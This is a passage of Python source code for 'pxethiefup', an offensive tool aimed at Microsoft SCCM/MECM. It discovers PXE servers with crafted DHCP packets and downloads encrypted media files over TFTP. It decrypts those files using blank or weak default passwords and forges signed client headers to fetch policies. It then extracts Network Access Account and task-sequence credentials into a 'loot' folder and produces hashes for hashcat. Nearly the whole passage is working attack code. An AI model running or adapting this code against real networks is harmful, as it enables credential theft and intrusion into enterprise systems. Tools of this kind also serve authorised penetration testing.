        """
        tree = ET.fromstring(ts_xml).getroottree()

        # Keywords to search through for potential credentials
        keyword_list = ["password", "account", "username"]
        element_search_list = []
        
        for word in keyword_list:
            # TODO  search through different attributes other than name? 
            element_search_list.append([word, tree.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + word +'")]')]) 
        
        parent_list = []
        creds_found = False

        for word, elements in element_search_list:
            for element in elements:
                if not creds_found:
                    # Print if a potential credential is in the list
                    if (VERBOSE):
                        print_nice("Possible credential fields found!", "SUCCESS")
                        creds_found = True

                # TODO if parent is defaultvarlist
                parent = element.getparent() 
                if parent not in parent_list:
                    parent_list.append(parent)
                    # Print the Task Sequence step it is using
                    task_sequence_step = parent.getparent().attrib["name"]
                    # Debug
                    print("In TS Step \"" + task_sequence_step + "\":")

                    unique_words = [x for x in keyword_list if x != word]

                    par = ET.ElementTree(parent)
                    for unique_word in unique_words:
                        for el in par.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + unique_word + '")]'):
                            # Duplicate tags that match more than one keyword
                            if el != element:
                                self.ts_credentials_found.append((task_sequence_step, el.attrib["name"], el.text))
                                # Debug
                                print(el.attrib["name"] + " - " + el.text)
                    # Debug
                    print(element.attrib["name"] + " - " + str(element.text))
                    self.ts_credentials_found.append((task_sequence_step, element.attrib["name"], element.text))

        if not creds_found:
            # Print no credentials found in task sequence
            if VERBOSE:
                print_nice("No credentials identified in this Task Sequence.", "ERROR")

    # Collection Settings
    def _process_collection_settings_xml(self):
        if (VERBOSE):
            print_nice("Extracting Collection Settings Secrets", "INFO")
            
        root = ET.fromstring(self.collection_settings_xml)
        instances = root.find("PolicyRule").find("PolicyAction").findall("instance")

        for instance in instances:
            collection_var_name = instance.xpath(".//*[@name='Name']/value")[0].text 
            encrypted_collection_var_secret = instance.xpath(".//*[@name='Value']/value")[0].text

            collection_var_secret = deobfuscate_credential_string(encrypted_collection_var_secret)
            collection_var_secret = collection_var_secret[:collection_var_secret.rfind('\x00')]
            if collection_var_secret != "" and collection_var_name != "":
                self.collection_settings_credentials.append((collection_var_name, collection_var_secret))
                #print_nice(f"Collection Variable Name: '{collection_var_name}'", "INFO")
                #print_nice(f"Collection Variable Secret: '{collection_var_secret}'", "INFO")

    # Output 
    def _print_naa_credentials_table(self):
        table = Table(title="NAA Credentials")
        table.add_column("Username", justify="center", no_wrap=True)
        table.add_column("Password", justify="center", no_wrap=True)
        for credential in self.naa_credentials:
            table.add_row(credential[0], credential[1])
        console = Console()
        console.print(table)

    def _print_ts_credentials_table(self):
        for cred in self.ts_credentials_found:
            ts_step = cred[0]
            value_name = cred[1]
            value_value = cred[2]

            table = Table(title="Potential Credentials - " + ts_step)
            table.add_column("Username", justify="center", no_wrap=True)
            table.add_column("Password", justify="center", no_wrap=True)
            table.add_row(value_name, str(value_value))
            console = Console()
            console.print(table)

    def _print_collection_settings_credentials_table(self):
        table = Table(title="Collection Settings Credentials")
        table.add_column("Variable Name", justify="center", no_wrap=True)
        table.add_column("Variable Secret", justify="center", no_wrap=True)
        for credential in self.collection_settings_credentials:
            table.add_row(credential[0], credential[1])
        console = Console()
        console.print(table)

    def print_all_credentials(self):
        if len(self.naa_credentials) > 0:
            self._print_naa_credentials_table()
        if len(self.ts_credentials) > 0:
            self._print_ts_credentials_table()
        if len(self.collection_settings_credentials) > 0:
            self._print_collection_settings_credentials_table()

    def output_all_credentials_to_file(self, path):
        if len(self.naa_credentials) > 0:
            write_to_file(path, "NAA_Credentials", json.dumps(self.naa_credentials), "json")
        if len(self.ts_credentials) > 0:
            write_to_file(path, "TS_Potential_Credentials", json.dumps(self.ts_credentials), "json")
        if len(self.collection_settings_credentials) > 0:
            write_to_file(path, "Collection_Settings_Credentials", json.dumps(self.collection_settings_credentials), "json")

def extract_key_information_from_variables(input):
    global BRANDING_TITLE
    global SITECODE
    global STANDALONE_MEDIA
    global SMS_MEDIA_GUID
    global WORKING_DIR
    global SCCM_BASE_URL
    global SMS_MEDIA_PFX

    root = ET.fromstring(input.encode("utf-16-le"))
    try:
        BRANDING_TITLE = root.find('.//var[@name="_SMSTSBrandingTitle"]').text
    except:
        pass
    try:
        SITECODE = root.find('.//var[@name="_SMSTSSiteCode"]').text
    except:
        pass
    try:
        STANDALONE_MEDIA = root.find('.//var[@name="_SMSTSStandAloneMedia"]').text
    except:
        pass
    try:
        SMSTSMP = root.find('.//var[@name="SMSTSMP"]')
    except:
        pass
    try:
        SMSTSLocationMPs = root.find('.//var[@name="SMSTSLocationMPs"]')
    except:
        pass
    try:
        SMS_MEDIA_SITE_CODE = root.find('.//var[@name="_SMSTSSiteCode"]').text
    except:
        pass
    try:
        SMS_MEDIA_PFX = root.find('.//var[@name="_SMSTSMediaPFX"]').text
    except:
        pass
    try:
        SMS_MEDIA_GUID = root.find('.//var[@name="_SMSMediaGuid"]').text
    except:
        pass

    WORKING_DIR = "loot/" + SITECODE + "_" + BRANDING_TITLE + "_" + SMS_MEDIA_GUID
    if not os.path.exists(WORKING_DIR):
        os.makedirs(WORKING_DIR)
    if not os.path.exists(WORKING_DIR + "/policies"):
        os.makedirs(WORKING_DIR + "/policies")

    if (SMS_MEDIA_GUID != "") and (SMS_MEDIA_PFX != ""):
        # Certificate used to securely communicate to the SCCM/MCM server
        filename = SMS_MEDIA_SITE_CODE + "_" + SMS_MEDIA_GUID +"_SMSTSMediaPFX.pfx"
        
        print_nice(f"Writing _SMSTSMediaPFX to {filename}", "INFO")
        print_nice(f"Certificate password is {SMS_MEDIA_GUID}", "INFO")

        # Target Folder instead?
        write_to_file(WORKING_DIR, filename, binascii.unhexlify(SMS_MEDIA_PFX), "binary")
        write_to_file(WORKING_DIR, f"{filename}_password", SMS_MEDIA_GUID, "txt")

    if SCCM_BASE_URL == "":
        if (VERBOSE):
            print_nice("Identifying Management Point URL from media variables", "INFO")

        if SMSTSMP is not None:
            SCCM_BASE_URL = SMSTSMP.text
        
        #Partial Media - SMSTSLocationMPs
        elif SMSTSLocationMPs is not None:    
            SCCM_BASE_URL = SMSTSLocationMPs.text
        else: 
            if (STANDALONE_MEDIA == "true"):
                if (VERBOSE):
                    print_nice("Standalone Media detected - No Management Point URL required", "INFO")
            else:
                if (VERBOSE):
                    print_nice("No Management Point URL found in media variables", "ERROR")
    
        if SCCM_BASE_URL != "":
            if (VERBOSE):
                print_nice("Management Point set to: " + SCCM_BASE_URL, "INFO")

    return [SMS_MEDIA_GUID, SMS_MEDIA_PFX]

def parse_media_files(password:str = None, variables_file:str = None, policy_file:str = None):
    #print(password)
    #print(variables_file)
    #print(policy_file)

    # Move files to a temporary working directory from now on
    temp_location = os.path.join(WORKING_DIR, ".temp_media_location")
    if (variables_file is not None):
        variables_file = copy_file_to_dir(variables_file, temp_location)
    if (policy_file is not None):
        policy_file = copy_file_to_dir(policy_file, temp_location)

    if (variables_file is not None):
        # Decrypt Media Variables File
        if (password == None):
            response, media_variables, resolved_password = test_default_weak_passwords_on_media(variables_file)
            if response:
                #print_nice("Successfully decrypted media variables file using default/weak password!", "SUCCESS")
                pass
        else:
            media_variables = decrypt_media_file(variables_file, password)

        if (media_variables == None):
            return [None, None]
        else:
            print_nice("Successfully decrypted media variables file!", "SUCCESS")
            # Extract Key Information from Media Variables
            smsMediaGuid, smsTSMediaPFX = extract_key_information_from_variables(media_variables)

            # Move decrypted media variables to the proper working directory
            variables_file = copy_file_to_dir(variables_file, f"{WORKING_DIR}/original_files/", delete_original=True)
            write_to_file(WORKING_DIR, "variables_decrypted", media_variables)

            # Code Escape if Standalone Media Type is identified            
            if (STANDALONE_MEDIA == "true" and policy_file is None):
                print_nice("Stand-alone media detected. Please supply Policy file.")
                return [None, None]
            
            # Decrypt Policy File
            if (policy_file is not None):
                policy_path = copy_file_to_dir(policy_file, f"{WORKING_DIR}/original_files/", delete_original=True)

                if (password == None):
                    password = smsMediaGuid
                
                decrypted_policy = decrypt_policy_file(policy_path, password)
                if decrypted_policy != None:
                    write_to_file(WORKING_DIR, "policies_decrypted", decrypted_policy)
                    return [[media_variables], [decrypted_policy]]
                else:
                    print_nice("Failed to decrypt Policy file.", "ERROR")
                    return [None, None]
                
            # If no Policy file is supplied but we were able to decrypt the media variables
            else:
                # If the PFX is there, then we can try and download the policies from the server
                if (smsMediaGuid != "") and (smsTSMediaPFX != ""):
                    return [[media_variables], None]

def parse_files_for_credentials(media_variables:str = None, policies:str = None, collection_settings:str = None):
    credprocessing = credential_processing_result()

    if media_variables is not None:
        if (VERBOSE):
            print_nice("Processing Media Variables Configuration", "INFO")
        for media_variable in media_variables:
            credprocessing.process_xml(media_variable, "naa")
    if policies is not None:
        if (VERBOSE):
            print_nice("Processing Task Sequence Configuration", "INFO")
        for policy in policies:
            credprocessing.process_xml(policy, "task_sequence")
    if collection_settings is not None:
        if (VERBOSE):
            print_nice("Processing Collection Settings Configuration", "INFO")
        for collection_setting in collection_settings:
            credprocessing.process_xml(collection_setting, "collection_settings")

    credprocessing.print_all_credentials()
    credprocessing.output_all_credentials_to_file(os.path.abspath(os.path.join(WORKING_DIR, "extracted_credentials"))) 

## PXE Networking retrieval
## ------------------
def find_pxe_server():
    # Find PXE server with DHCP discover packet with the right options set 
    print_nice("Sending initial DHCP Discover to find PXE boot server...")

    # DHCP Discover packet is from IP 0.0.0.0, with destination 255.255.255.255 and ff:ff:ff:ff:ff:ff destination MAC address. 
    # Need to ask for DHCP options 66 and 67 to find PXE servers
    pkt = Ether(
        dst="ff:ff:ff:ff:ff:ff"
        )/IP(
        src="0.0.0.0", 
        dst="255.255.255.255"
        )/UDP(
            sport=68, 
            dport=67
        )/BOOTP(
            chaddr=clientMacAddress
            )/DHCP(
                options=[(
                    "message-type", 
                    "discover"
                ),
            (
            'param_req_list',
            [1,3,6,66,67]
        ),
        "end"]
    )

    """ TODO: 
        - Add a timeout option
    """

    # Make scapy ignore IP address when checking for responses (needed because we sent to a broadcast address)
    conf.checkIPaddr = False 

    # This could fail if multiple DHCP servers exist in the environment and only some of them offer the PXE server in their response
    # This is out loop to check if we have a valid PXE server response
    ans = srp1(
        pkt,
        timeout = 5,
        # Uncomment to enable verbose scapy output with the ... style
        # verbose = 0
    )
    conf.checkIPaddr = True

    if ans:
        packet = ans

        # Pull out DHCP offer from received answer packet
        dhcp_options = packet[1][DHCP].options

        tftp_server = next(
            (opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "tftp_server_name"),
            None
        )
        
        if tftp_server:
            # Come back to and review the rstrip and update this potentially?
            # DHCP option 66 is TFTP Server Name
            tftp_server = tftp_server.rstrip(b"\0").decode("utf-8") 

            boot_file = next(
                (opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "boot-file-name"),
                None
            )

            if boot_file:
                # Come back to and review the rstrip and update this potentially?
                # DHCP option 67 is Bootfile Name
                boot_file = boot_file.rstrip(b"\0").decode("utf-8")
    else:
        print_nice("No DHCP responses received with PXE boot options", "ERROR") 
        return None
    
    print_nice(f"Received DHCP offer from PXE server: {packet[1][IP].src}")
    
    # Catch for nonetype dhcp response
    if tftp_server is None:
        print_nice("No TFTP server name found in the DHCP offer packet", "ERROR")
        return None

    # Need to dig into this more because surely this can be done easier?
    tftp_server = validate_ip_or_resolve_hostname(tftp_server.strip())

    print_nice("PXE Server IP: " + tftp_server)
    print_nice("Boot File Location: " + boot_file)

    return tftp_server

def get_variable_file_path(tftp_server):
    global BLANK_PASSWORDS_FOUND
    # Ask SCCM for location to download variable file. This is done with a DHCP Request packet
    print_nice("Asking ConfigMgr for location to download the media variables and BCD files...")

    # Media Variable file is generated by sending DHCP request packet to port 4011 on a PXE enabled DP. 
    # This contains DHCP options 60, 93, 97 and 250

    # Craft the Packet for requesting the variable file location
    # multicast/link-local in use for the Destination to allow for multicast to use a specific interface: https://scapy.readthedocs.io/en/latest/usage.html#multicast
    pkt = IP(src=clientIPAddress, dst=ScopedIP(tftp_server, scope=conf.iface))/UDP(sport=68, dport=4011)/BOOTP(ciaddr=clientIPAddress, chaddr=clientMacAddress)/DHCP(options=[
        ("message-type", "request"),
        # 3c 80 81 82 83 84 85 86 87
        ('param_req_list', [60, 128, 129, 130, 131, 132, 133, 134, 135]), 

        # x86 architecture
        ('pxe_client_architecture', b'\x00\x00'), 

        # x64 private option
        (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")),

        # x86 private option
        # (250,binascii.unhexlify("0d0208000e010101020006050400000006ff")),

        ('vendor_class_id', b'PXEClient'), 

        # Included by the client, but doesn't seem to be necessary in WDS PXE server configurations
        #('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), 
        "end"]
    )
    """
     sr return value: 
        ans, 
        unans/packetpair1,
        packetpair2 (i.e. PacketPairList)/sent packet,
        received packet/Layers(Ethernet,IP,UDP/TCP,BOOTP,DHCP)
    """

    ans = sr1(
        pkt,
        timeout=10,
        filter="udp port 4011 or udp port 68"
    ) 

    encrypted_key = None
    if ans:
        packet = ans
        dhcp_options = packet[1][DHCP].options
    
        # Option 243 is the DHCP option for SCCM supply the Variable File Location
        # Does the received packet contain DHCP Option 243? DHCP option 243 is used by SCCM to send the variable file location

        # Debug
        for i in dhcp_options:
            print(i)

        # If BCD only then waiting for Approval
        ## Need to fix the catch for BCD only when the SCCM responds without a variables file
        variables_file = None
        for opt in dhcp_options:
            if isinstance(opt, tuple) and opt[0] == 243:
                option_number, variables_file = opt
                break

        #option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243) 
        
        if variables_file:
            # First byte of the option data determines the type of data that follows
            # Second byte of the option data is the length of data that follows
            # TLV Option Output
            packet_type = variables_file[0]
            data_length = variables_file[1]

            # If the first byte is set to 1, this is the location of the encrypted media file on the TFTP server (variables.dat)
            if packet_type == 1:
                # Skip first two bytes of option and copy the file name by data_length
                variables_file = variables_file[2:2+data_length]
                variables_file = variables_file.decode('utf-8')

            # If the first byte is set to 2, this is the encrypted key stream that is used to encrypt the media file. The location of the media file follows later in the option field
            elif packet_type == 2:
                # Skip first two bytes of option and copy the encrypted data by data_length
                encrypted_key = variables_file[2:2+data_length]
                
                # Get the index of data_length of the variables file name string in the option, and index of where the string begins
                string_length_index = 2 + data_length + 1
                beginning_of_string_index = 2 + data_length + 2

                # Read out string length
                string_length = variables_file[string_length_index]

                # Read out variables.dat file name and decode to utf-8 string
                variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length] 
                variables_file = variables_file.decode('utf-8')
            
            # DHCP option 252 is used by SCCM to send the BCD file location
            bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")  
        else:
            print_nice("[-] No variable file location (DHCP option 243) found in the received packet when the PXE boot server was prompted for a download location", "ERROR") 
            return None
    else:
        print_nice(f"No DHCP responses recieved from MECM server {tftp_server}", "ERROR")
        print_nice(f"This may indicate that the wrong IP address was provided or that there are firewall restrictions blocking DHCP packets to the required ports", "ERROR")
        return None

    print_nice(f"Variables File Location: {variables_file}")
    print_nice(f"BCD File Location: {bcd_file}")

    if encrypted_key:
        BLANK_PASSWORDS_FOUND = True
        print_nice("Blank password on PXE boot found!")
        return [variables_file, bcd_file, encrypted_key]
    else:
        return [variables_file, bcd_file]

def get_pxe_files(ip):
    if ip == None:
        # If not, discover via DHCP
        print_nice("Discovering PXE Server through DHCP...")
        # Scan for PXE Server
        tftp_server_ip = find_pxe_server()
        if tftp_server_ip is None:
            print_nice("Failed to find PXE server via DHCP", "ERROR")
            return False
        else:
            print_nice(f"PXE Server found from DHCP at {tftp_server_ip}")
    else:
        # If IP is supplied by the user
        print_nice(f"Targeting user-specified host: {ip}")
        # Target the specified host
        tftp_server_ip = validate_ip_or_resolve_hostname(ip)

    # Try and get the variables from the PXE server
    answer_array = get_variable_file_path(tftp_server_ip)
    if answer_array is None:
        print_nice("Failed to get variable file path from PXE server", "ERROR")
        return False

    # Variables.dat
    variables_file = answer_array[0]
    variables_filename = variables_file.split("\\")[-1]

    # Bootdisk
    bcd_file = answer_array[1]
    bcd_filename = bcd_file.split("\\")[-1]

    # If the BCD validated file contains a blank password, use it
    if BLANK_PASSWORDS_FOUND:
        encrypted_key = answer_array[2]
        write_to_file(WORKING_DIR, "encrypted_key", encrypted_key, "binary")

    tftp_client = tftpy.TftpClient(tftp_server_ip, 69)
    tftp_client.download(variables_file, WORKING_DIR + variables_filename)
    tftp_client.download(bcd_file, WORKING_DIR + bcd_filename)

    if BLANK_PASSWORDS_FOUND:
        print_nice("Attempting automatic exploitation.", "INFO")
        decrypted_media_variables = decrypt_pxe_media_from_encrypted_key(encrypted_key, WORKING_DIR + variables_filename)
        if decrypted_media_variables is not None:
            print_nice("Writing media variables to variables.xml", "INFO")
            write_to_file(WORKING_DIR, "variables", decrypted_media_variables)
            smsMediaGuid, smsTSMediaPFX = extract_key_information_from_variables(decrypted_media_variables)
            download_and_decrypt_policies_using_certificate(smsMediaGuid, smsTSMediaPFX) 
        else:
            print_nice("Failed to decrypt media variable file using the key retrieved from DHCP option 243", "ERROR")
    else:
        # Lol, print this why not?
        print_nice("User configured password detected for task sequence media.", "INFO")
        generate_hashcat_output(WORKING_DIR + variables_filename)
    
    return True

def download_and_decrypt_policies_using_certificate(guid, cert_bytes):
    #Parse the downloaded task sequences and extract sensitive data if present
    smsMediaGuid = guid
    CCMClientID = smsMediaGuid
    smsTSMediaPFX = binascii.unhexlify(cert_bytes)
    
    key, cert = load_pfx(smsTSMediaPFX, smsMediaGuid[:31].encode())
    if (VERBOSE):
            print_nice('Generating Client Authentication headers using PFX File', "INFO")

    data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
    CCMClientIDSignature = CryptoTools.sign(key, data)
    if (VERBOSE):
        print_nice("CCMClientID Signature Generated", "INFO")

    CCMClientTimestamp = dt.datetime.now(dt.UTC).replace(microsecond=0).isoformat()+'Z'
    data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
    CCMClientTimestampSignature = CryptoTools.sign(key, data)
    if (VERBOSE):
        print_nice("CCMClientTimestamp Signature Generated", "INFO")

    clientToken = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
    clientTokenSignature = CryptoTools.sign(key, clientToken).hex().upper()
    if (VERBOSE):
        print_nice("ClientToken Signature Generated", "INFO")

    # Add a pre-flight check for the HTTP requests
    valid_host = validate_ip_or_resolve_hostname(SCCM_BASE_URL)
    if valid_host is None:
        print_nice("Please check your DNS settings or use the target flag to set the Management Point URL.", "INFO")
        return

    try:
        naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(
            CCMClientID,
            CCMClientIDSignature,
            CCMClientTimestamp,
            CCMClientTimestampSignature,
            clientTokenSignature,
            key
        )
    
    except Exception as e:
        print("If you encountered errors at this point, it is likely as a result of one of two things: a) network connectivity or b) the signing algorithm\n")
        print("Fix network connectivity issues by ensuring you can connect to the HTTP port on the server and fixing DNS issues or by using the SCCM_BASE_URL to hardcode the beginning of the URL used to access the MP: e.g. http://192.168.56.101\n")
        # This should be worth reviewing more in depth, this could be caught another way for sure?
        print("The SHA1 signing algorithm is implemented by generateSignedData and the SHA256 signing algorithm is implemented by generateClientTokenSignature\n")
        print("If you encountered errors, for CCMClientIDSignature, CCMClientTimestampSignature and clientTokenSignature change the current signing algorithm to the one not in use")
        print(e)
        return

    # # Processing the unknown computer collections for secrets
    # # Collection Settings
    # if (colsettings is not None) and (len(colsettings) > 0):
    #     if (VERBOSE):
    #         print_nice("Processing Collection Settings for collection", "INFO")
    #     for colsetting in colsettings:
    #         # Again, this can be done in a better way for sure
    #         write_to_file(WORKING_DIR, "CollectionSettings", colsetting, "xml")

    #         credential_processing_result.process_xml(colsetting, "collection_settings")

    # # Network Access Accounts
    # if (VERBOSE):
    #     print_nice("Processing Network Access Account Configurations", "INFO")
    # for naaConfig in naaConfigs:
    #     credential_processing_result.process_xml(naaConfig, "naa")

    # # Task Sequences Accounts
    # if (VERBOSE):
    #     print_nice("Processing Task Sequence Configuration", "INFO")
    # for tsConfig in tsConfigs:
    #     credential_processing_result.process_xml(tsConfig, "task_sequence")

    # credential_processing_result.print_all_credentials()

    parse_files_for_credentials(media_variables = naaConfigs, policies = tsConfigs, collection_settings = colsettings)


## Main
## ------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
            prog="pxethiefup", 
            formatter_class=argparse.RawDescriptionHelpFormatter,
            description="An upgraded version of PXEThief used for extracting sensitive data from SCCM/MECM material and servers",
            epilog='''
            Broadcast for DHCP and use PXE to try to download the PXE Materials:
                python3 pxethiefup.py -a
                python3 pxethiefup.py --auto

            Request a target MECM Distribution Point server for PXE Materials:
                python3 pxethiefup.py -m -t 10.1.1.2
                python3 pxethiefup.py --manual -target 10.1.1.2

            Use a specific network interface (scapy int value) when requesting the PXE files from a manual interface:
                python3 pxethiefup.py -m -t 10.1.1.2 -i 73
                python3 pxethiefup.py --manual -target 10.1.1.2 --interface 73

            Search a folder for SCCM media files (including ISO) and decrypt them:
                python pxethiefup.py -d -f "..\\folder\\"
                python pxethiefup.py --decrypt -f "..\\folder\\"

            Decrypt a partial or network based media - Variables file with no password or unknown password:
                python3 pxethiefup.py -d -vf variables.xml
                python3 pxethiefup.py --decrypt --variables variables.xml

            Decrypt a partial or network based media - Variables file using a password:
                python3 pxethiefup.py -d -vf variables.xml -p password123
                python3 pxethiefup.py --decrypt --variables variables.xml --password password123

            Decrypt the full media using a variables and policy file:
                python3 pxethiefup.py -d -vf variables.xml -pf policies.xml -p password123
                python3 pxethiefup.py --decrypt --variables variables.xml --policy policies.xml --password password123

            Display the hash corresponding to a media variables file for cracking in hashcat:
                python3 pxethiefup.py -c -vf variables.xml
                python3 pxethiefup.py --crack --variables variables.xml
                '''
        )

    # PXE Booting Options
    parser.add_argument("-a", "--auto", help="Automatically identify and download encrypted media file using DHCP PXE boot request", action="store_true")
    parser.add_argument("-m", "--manual", help="Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address", action="store_true")
    parser.add_argument("-t", "--target", help="Target IP address of the MECM Distribution Point server", nargs='?')

    parser.add_argument("-u", "--url", help="Manually specify the URL of the MECM Distribution Point server (useful for when you don't have DNS)", nargs='?')

    # Offline Decryption
    # Do I actually need the decrypt flag here, or can I just check for the presence of the other flags?
    parser.add_argument("-d", "--decrypt", help="Decrypt a media variables file and/or policies.xml", action="store_true")

    parser.add_argument("-f", "--folder", help="Folder containing files for decryption", nargs='?')
    parser.add_argument("-vf", "--variables", help="Variable file to decrypt", nargs='?')
    parser.add_argument("-pf", "--policy", help="Policy file to decrypt", nargs='?')

    parser.add_argument("-p", "--password", help="Password to decrypt the media variables file (for hex input, use 0x prefix)", nargs='?')

    # Utils
    parser.add_argument("-c", "--crack", help="Print the hash corresponding to a specified media variables file for cracking in hashcat", action="store_true")

    # Generic flags
    parser.add_argument("-v", "--verbose", help="Enable verbose output", action="store_true")
    parser.add_argument("-l", "--list-interfaces", help="List available network interfaces", action="store_true")
    parser.add_argument("-i", "--interface", help="Specify the network interface to use (int)", default=None)

    args = parser.parse_args()

    SELECTED_INTERFACE = None

    # If mutually exclusive options are selected, print help and exit
    count = 1
    if (args.auto):
        count += 1
    if (args.manual):
        count += 1
    if (args.decrypt):
        count += 1
    if (args.crack):
        count += 1
    if (args.list_interfaces):
        count += 1

    if (count > 2):
        print_nice("Please select only one option at a time", "ERROR")
        parser.print_help()
        sys.exit(0)
    elif (count < 2):
        print_nice("Please select an option", "ERROR")
        parser.print_help()
        sys.exit(0)

    if args.verbose:
        VERBOSE = True

    if (args.list_interfaces):
        list_network_interfaces()
        sys.exit(0)

    if (args.interface):
        # Interface should be an integer
        try:
            args.interface = int(args.interface)
        except ValueError:
            print_nice("Please provide the Interfaces Index from Scapy", "ERROR")
            list_network_interfaces()
            sys.exit(0)
        
        SELECTED_INTERFACE = args.interface

    if (args.url):
        base_url_override = validate_ip_or_resolve_hostname(args.url)
        if base_url_override is None:
            print_nice("Failed to resolve Management Point hostname or IP address.", "ERROR")
        else:
            SCCM_BASE_URL = args.url

    if (args.auto):
        print_nice("Finding and downloading encrypted media variables file from MECM server...")
        configure_scapy_networking(None, SELECTED_INTERFACE)
        get_pxe_files(None)

    elif (args.manual):
        if args.target is None:
            print_nice("Please provide a target IP address or hostname", "ERROR")
            parser.print_help()
        else:
            # TODO!
            # Convert a / to a list of IPs
            #ip_list = ipaddress.ip_network(args.target, strict=False)
            #ip_list = list(ip_list.hosts())

            #for ip in ip_list:
            #    # TODO!
            #    print_nice(f"Attempting to download media variables file from MECM server located at: {ip}", "INFO")
            #    print(f"Configuring Scapy networking for interface: {SELECTED_INTERFACE}", "INFO")
            #    configure_scapy_networking(str(ip), SELECTED_INTERFACE)
            #    get_pxe_files(str(ip))

            print_nice(f"Generating and downloading encrypted media variables file from MECM server located at: {args.target}")
            configure_scapy_networking(args.target, SELECTED_INTERFACE)
            get_pxe_files(args.target)

    elif (args.decrypt):
        # Decrypt media variables file using password
        variables_path = None
        password = None
        policy_path = None

        # Preflight Check for mutually exclusive options
        if (args.folder != None and args.variables != None):
            print_nice("Please select either a folder or a media variables file, not both", "ERROR")
            parser.print_help()
            sys.exit(0)

        # Folder Scanning
        if (args.folder != None):
            print_nice("Scanning folder for media variables file", "INFO")
            folder = args.folder
            # Catches the issue where an unescaped \\ is added to the end of the folder path
            if (folder.endswith("\"") == True):
                folder = folder[:-1]

            # Preflight check to ensure the folder exists
            if (os.path.isdir(folder) == False):
                print_nice("Folder does not exist, exiting", "ERROR")
                parser.print_help()
                sys.exit(0)

            variables_path, policy_path = scan_for_files(folder)
            
            if (variables_path == None):
                print_nice("No media variables file found in folder", "ERROR")
                sys.exit(0)

        # Raw flag for variables file
        if (args.variables != None):
            variables_path = args.variables
        elif (args.folder != None and args.variables == None):
            pass
        elif (variables_path == None):
            print_nice("Please provide a media variables file to decrypt", "ERROR")
            parser.print_help()
            sys.exit(0)

        if (args.policy != None):
            policy_path = args.policy

        if (args.password != None):
            password = args.password
            if (password.startswith("0x")):
                # Hex encoded password, aka when we have a password used for boot.var files
                password = binascii.unhexlify(password[2:])

        media_variables, decrypted_policy = parse_media_files(password, variables_path, policy_path)

        if (media_variables != None):
            if (decrypted_policy == None):
                # Network Based / Standalone Media with a variables file only
                download_and_decrypt_policies_using_certificate(SMS_MEDIA_GUID, SMS_MEDIA_PFX)
            else:
                # Standalone Media with a variables file and policy file
                parse_files_for_credentials(decrypted_policy, decrypted_policy)
        else:
            # print_nice("Please provide either a media variables file and/optionally a policy file to decrypt", "ERROR")
            pass

    elif (args.crack):
        # Output the hash of a encrypted variables file to crack offline using hashcat
        if (args.variables is None):
            print_nice("Please provide a media variables file to generate the hash for", "ERROR")
        else:
            print_nice(f"Generating hash for media variables file: {args.variables}", "GREEN")
            generate_hashcat_output(args.variables)
